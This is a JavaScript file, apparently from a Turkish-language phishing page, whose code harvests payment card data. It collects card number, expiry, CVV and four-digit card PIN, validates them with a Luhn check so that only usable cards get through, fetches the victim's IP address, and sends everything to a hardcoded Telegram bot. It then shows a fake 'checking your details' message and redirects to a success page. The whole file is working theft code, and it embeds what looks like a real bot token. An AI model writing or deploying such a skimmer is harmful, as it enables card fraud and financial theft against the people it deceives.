// phmain.js - TAM ÇALIŞAN VERSİYON

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

// Slider fonksiyonları
window.slider1 = { prev: function() { console.log('prev'); } };
window.closeAlert = function() { 
    var el = document.getElementById('alertDiv');
    if(el) el.style.display = 'none';
};
window.uyariKapat = function() { 
    var el = document.getElementById('alertDiv3');
    if(el) el.style.display = 'none';
};

// Luhn algoritması
function luhnKontrol(kartNo) {
    var sum = 0;
    var alternate = false;
    for (var i = kartNo.length - 1; i >= 0; i--) {
        var n = parseInt(kartNo.charAt(i), 10);
        if (alternate) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

// SKT kontrol
function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    var ay = parseInt(skt.substring(0,2), 10);
    var yil = parseInt(skt.substring(3,5), 10);
    var now = new Date();
    var nowYil = now.getFullYear() % 100;
    var nowAy = now.getMonth() + 1;
    
    if (ay < 1 || ay > 12) return false;
    if (yil < nowYil) return false;
    if (yil === nowYil && ay < nowAy) return false;
    return true;
}

// IP alma
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(function(res) { return res.json(); })
        .then(function(data) { callback(data.ip); })
        .catch(function() { callback('Bilinmiyor'); });
}

// Telegram'a gönder
function sendToTelegram(message) {
    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
    fetch(url).catch(console.log);
}

// Kırmızı kaplama göster
function showAlert(msg) {
    var alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        var p = alertDiv.querySelectorAll('p');
        if (p[2]) p[2].innerText = msg;
    }
}

// Sayfa yüklendiğinde butonu bağla
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM yüklendi');
    
    var btn = document.getElementById('btn-spc');
    console.log('Buton bulundu:', btn);
    
    if (btn) {
        btn.onclick = function(e) {
            e.preventDefault();
            console.log('Butona tıklandı!');
            
            var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
            var skt = document.getElementById('exp').value;
            var cvv = document.getElementById('cvv').value;
            var sifre = document.getElementById('kkpw').value;
            
            console.log('Kart No:', kartNo);
            console.log('SKT:', skt);
            console.log('CVV:', cvv);
            console.log('Şifre:', sifre);
            
            // Doğrulamalar
            if (!kartNo || kartNo.length !== 16) {
                showAlert('Kart numarası 16 haneli olmalıdır.');
                return;
            }
            if (!luhnKontrol(kartNo)) {
                showAlert('Geçersiz kart numarası!');
                return;
            }
            if (!skt || skt.length !== 5) {
                showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
                return;
            }
            if (!sktKontrol(skt)) {
                showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
                return;
            }
            if (!cvv || cvv.length !== 3) {
                showAlert('CVV 3 haneli olmalıdır.');
                return;
            }
            if (!sifre || sifre.length !== 4) {
                showAlert('Kart şifresi 4 haneli olmalıdır.');
                return;
            }
            
            // Kırmızı kaplamayı gizle
            document.getElementById('alertDiv').style.display = 'none';
            
            getIP(function(ip) {
                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
                sendToTelegram(mesaj);
                alert('Bilgileriniz kontrol ediliyor...');
                window.location.href = 'success.html';
            });
        };
    } else {
        console.log('Buton BULUNAMADI! ID kontrol et.');
    }
});
